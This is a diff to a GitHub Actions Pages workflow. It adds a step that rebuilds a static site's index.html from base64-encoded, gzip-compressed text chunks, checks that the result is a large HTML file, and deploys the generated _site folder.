@@ -23,12 +23,46 @@ jobs:
     steps:
       - name: Checkout
         uses: actions/checkout@v4
+
+      - name: Rebuild static app
+        shell: bash
+        run: |
+          python3 - <<'PY'
+          from pathlib import Path
+          import base64, gzip
+
+          payload = Path('payload')
+          chunks = []
+          for i in range(11):
+              text = (payload / f'part-{i:02d}.txt').read_text(encoding='utf-8')
+              if i < 10:
+                  text = text[:12000]
+              chunks.append(text)
+
+          packed = ''.join(chunks)
+          raw = base64.b64decode(packed, validate=True)
+          html = gzip.decompress(raw)
+          if not html.lstrip().lower().startswith(b'<!doctype html>'):
+              raise SystemExit('Decoded payload is not HTML')
+          if len(html) < 200000:
+              raise SystemExit(f'Decoded app is unexpectedly small: {len(html)} bytes')
+
+          out = Path('_site')
+          out.mkdir(exist_ok=True)
+          (out / 'index.html').write_bytes(html)
+          print(f'Rebuilt index.html: {len(html)} bytes')
+          PY
+          cp -R assets _site/assets
+          touch _site/.nojekyll
+
       - name: Setup Pages
         uses: actions/configure-pages@v5
+
       - name: Upload artifact
         uses: actions/upload-pages-artifact@v3
         with:
-          path: '.'
+          path: '_site'
+
       - name: Deploy to GitHub Pages
         id: deployment
         uses: actions/deploy-pages@v4
